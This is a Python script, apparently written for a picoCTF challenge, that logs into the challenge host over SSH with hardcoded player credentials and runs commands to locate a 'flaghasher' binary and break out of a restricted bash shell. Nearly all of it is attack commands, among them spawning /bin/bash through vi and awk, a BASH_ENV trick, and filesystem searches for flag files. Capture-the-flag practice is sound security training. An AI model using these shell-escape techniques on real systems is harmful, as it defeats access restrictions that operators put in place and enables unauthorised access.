#!/usr/bin/env python3
import paramiko, sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

HOST = "rescued-float.picoctf.net"
PORT = 60715
USER = "ctf-player"
PASS = "a630e1f8"

def run(client, cmd, timeout=10, get_pty=True):
    print(f"\n$ {cmd}")
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout, get_pty=get_pty)
    out = stdout.read().decode(errors="replace")
    err = stderr.read().decode(errors="replace")
    if out: sys.stdout.write(out)
    if err: sys.stdout.write("[stderr] " + err)
    return out, err

c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect(HOST, PORT, USER, PASS, timeout=15)
print(f"[OK] Connected as {USER}@{HOST}:{PORT}")

# rbash bypass: use 'command' or just call the binary by name
run(c, "echo $PATH; type flaghasher 2>&1; which flaghasher 2>&1; compgen -c | grep -i flag")
run(c, "flaghasher </dev/null 2>&1 | head -20")
run(c, "echo 'flaghasher' | flaghasher 2>&1 | head -20")

# Test bypass methods
run(c, "BASH_ENV=/dev/null bash -c 'echo hi' 2>&1")
run(c, "vi -c ':!/bin/bash' /dev/null </dev/null 2>&1 | head -3", timeout=3)
run(c, "awk 'BEGIN{system(\"/bin/bash\")}' </dev/null 2>&1 | head -3", timeout=3)
run(c, "find / -name 'flaghasher' 2>/dev/null; find / -name 'flag*' 2>/dev/null | head -10")
run(c, "ls -la /opt /usr/local/bin 2>&1 | head -20")
c.close()
